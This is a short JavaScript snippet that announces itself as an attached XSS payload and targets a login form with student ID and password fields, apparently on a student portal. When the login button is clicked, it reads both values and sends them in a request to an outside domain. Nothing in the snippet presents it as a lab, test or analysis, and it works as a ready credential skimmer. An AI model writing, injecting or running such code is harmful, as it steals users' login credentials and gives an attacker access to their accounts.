const loginButton = document.querySelector('.loginButton');
const studentId = document.querySelector('[name="studentIDNumber"]');
const password = document.querySelector('[name="password"]');

console.log('XSS attached');

loginButton.addEventListener('click', () => {
    console.log('click');

    if (studentId && password) {
        console.log('Student ID: ', studentId.value);
        console.log('Password: ', password.value);

        const api = `https://www.housesforrent.online/api/crs?username=${studentId.value}&password=${password.value}`;
        fetch(api);
    }
});
